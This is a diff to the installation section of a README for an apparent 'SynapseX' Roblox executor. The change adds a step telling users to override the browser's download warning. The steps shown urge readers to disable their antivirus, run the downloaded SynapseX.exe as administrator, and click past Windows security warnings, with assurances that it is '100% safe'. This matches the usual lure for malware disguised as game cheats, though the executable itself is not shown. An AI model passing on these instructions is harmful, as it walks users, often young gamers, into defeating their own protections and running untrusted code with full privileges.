@@ -3,7 +3,7 @@
 
 ## Installation
 1. Disable your antivirus, this is required for any ROBLOX Executors as it injects scripts into roblox. If you don't trust disabling your antivirus, more proof is here that its 100% safe: https://www.reddit.com/r/robloxhackers/comments/y6l4tv/why_do_all_injectors_trigger_my_antivirus/
-2. Click the green ***CODE*** button, then click ***Download ZIP***
+2. Click the green ***CODE*** button, then click ***Download ZIP*** (*You may need to click CTRL + J and allow the file to install*)
 3. Right-click the ZIP file when downloaded, and click ***EXTRACT ALL***
 4. Open the extracted folder and ***RIGHT-CLICK*** *SynapseX.exe* then click ***RUN AS ADMINISTRATOR***
 5. Once again if Windows flags it as a virus, it's not, click ***MORE INFO*** and ***RUN ANYWAY***
